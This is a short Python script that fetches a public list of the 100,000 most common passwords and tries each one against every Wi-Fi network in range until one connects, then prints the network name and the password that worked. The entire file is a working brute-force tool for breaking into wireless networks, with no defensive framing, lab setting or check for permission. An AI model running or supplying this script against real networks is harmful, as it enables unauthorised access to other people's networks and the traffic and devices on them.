#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import urllib.request
from wifi import Cell, Scheme, exceptions

def start():
    # Fetch top 100K most used passwords
    print("Fetching top 100K most used passwords from GitHub...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords-100000.txt"
    response = urllib.request.urlopen(url)
    passwords = response.read().splitlines()

    # Get networks
    interface = 'wlan0'  # Replace with your actual wireless interface
    try:
        networks = Cell.all(interface)
    except exceptions.InterfaceError as e:
        print(f"Error: {e}")
        sys.exit(1)

    nb_loops = len(passwords) * len(networks)
    print(f"{len(networks)} networks found. The program will loop {nb_loops} times!")

    # Scan for networks
    nb_test = 0
    for password in passwords:
        for cell in networks:
            try:
                scheme = Scheme.for_cell(interface, 'home', cell, password)
                scheme.activate()
                print(f"Connected to {cell.ssid} with password `{password}`!")
                sys.exit(0)
            except exceptions.ConnectionError:
                pass
            finally:
                nb_test += 1

            sys.stdout.write(f'\r{nb_test} / {nb_loops}')
            sys.stdout.flush()

    print("No passwords worked :(")

if __name__ == "__main__":
    start()
